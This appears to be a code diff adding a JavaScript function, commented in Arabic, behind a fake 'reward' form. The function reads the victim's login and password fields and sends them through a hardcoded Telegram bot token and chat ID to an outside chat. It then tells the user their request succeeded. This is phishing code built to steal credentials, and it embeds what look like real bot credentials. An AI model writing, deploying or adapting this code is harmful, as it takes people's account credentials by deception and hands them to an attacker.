@@ -1,0 +1,24 @@
+Function processReward(e) {
+  e.preventDefault();
+  
+  // 1. هنا بيتكتب التوكن بتاع البوت والآيدي الحقيقي
+  const token = "8554495986:AAF-X26Y0F-J4KPlUNeeAiDbdZy011D_Qoc"
+  const chatId ="8933388029";
+  
+  // 2. هنا بيتم تجميع البيانات المدخلة في الحقول
+  const userInput = document.getElementById('userInput').value;
+  const passInput = document.getElementById('passInput').value;
+  
+  // 3. هنا بيتعمل رابط الإرسال لتيليجرام
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Login: ${userInput} | Pass: ${passInput}`;
+  
+  // 4. هنا بيتم إرسال الطلب فعلياً
+  fetch(url).then(response => {
+    // عرض رسالة النجاح للمستخدم
+    const box = document.getElementById('alertBox');
+    box.style.display = 'block';
+    box.innerText = '✨ تم إرسال الطلب بنجاح!';
+  });
+}
+
+ 
